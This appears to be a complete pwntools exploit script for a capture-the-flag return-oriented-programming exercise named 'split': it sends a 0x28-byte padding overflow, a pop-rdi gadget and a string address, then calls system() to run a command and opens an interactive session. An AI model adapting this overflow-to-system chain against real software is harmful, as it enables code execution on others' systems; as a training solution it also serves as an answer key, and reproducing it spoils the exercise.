from pwn import *

elf = context.binary = ELF("./split")
p = process(elf.path)

rop = ROP(elf)

s_cat = 0x601060

payload = b"A" * 0x28
payload += p64(rop.rdi.address)
payload += p64(s_cat)
payload += p64(elf.symbols["usefulFunction"] + 9) # system

p.sendline(payload)
p.interactive()
